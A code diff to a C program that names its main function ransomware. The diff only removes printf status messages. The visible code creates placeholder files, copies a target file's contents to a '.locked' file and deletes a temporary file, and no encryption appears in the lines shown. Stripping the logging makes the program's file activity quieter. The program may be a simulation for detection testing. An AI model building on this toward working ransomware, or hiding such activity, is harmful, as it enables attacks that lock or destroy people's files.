@@ -17,7 +17,6 @@ void ransomware(const char *file_path) {
     filename++;
 
     // Open file x
-    printf("Created file x\n");
     char x_path[500];
     sprintf(x_path, "%s/x", directory);
     int x_fd = open(x_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
@@ -25,17 +24,14 @@ void ransomware(const char *file_path) {
         perror("open");
         exit(EXIT_FAILURE);
     }
-    printf("Opened file x\n");
     const char *x_content = "This is the x file\n";
     if (write(x_fd, x_content, strlen(x_content)) == -1) {
         perror("write");
         close(x_fd);
         exit(EXIT_FAILURE);
     }
-    printf("Modified file x\n");
 
     // Create file c
-    printf("Created file c\n");
     char c_path[500];
     sprintf(c_path, "%s/c", directory);
     int c_fd = open(c_path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
@@ -43,14 +39,12 @@ void ransomware(const char *file_path) {
         perror("open");
         exit(EXIT_FAILURE);
     }
-    printf("Opened file c\n");
     const char *c_content = "This is the c file\n";
     if (write(c_fd, c_content, strlen(c_content)) == -1) {
         perror("write");
         close(c_fd);
         exit(EXIT_FAILURE);
     }
-    printf("Modified file c\n");
 
     // Open the original file
     int original_fd = open(file_path, O_RDONLY);
@@ -89,7 +83,6 @@ void ransomware(const char *file_path) {
         close(x_fd);
         exit(EXIT_FAILURE);
     }
-    printf("Modified file x\n");
     if (write(locked_fd, buffer, file_content_size) == -1) {
         perror("write");
         close(original_fd);
@@ -103,7 +96,6 @@ void ransomware(const char *file_path) {
         close(locked_fd);
         exit(EXIT_FAILURE);
     }
-    printf("Created file %s.locked\n", filename);
     close(original_fd);
     close(locked_fd);
     // Delete the x file
@@ -126,6 +118,5 @@ int main(int argc, char *argv[]) {
     }
 
     ransomware(argv[1]);
-    printf("Ransomware executed successfully.\n");
     return EXIT_SUCCESS;
 }
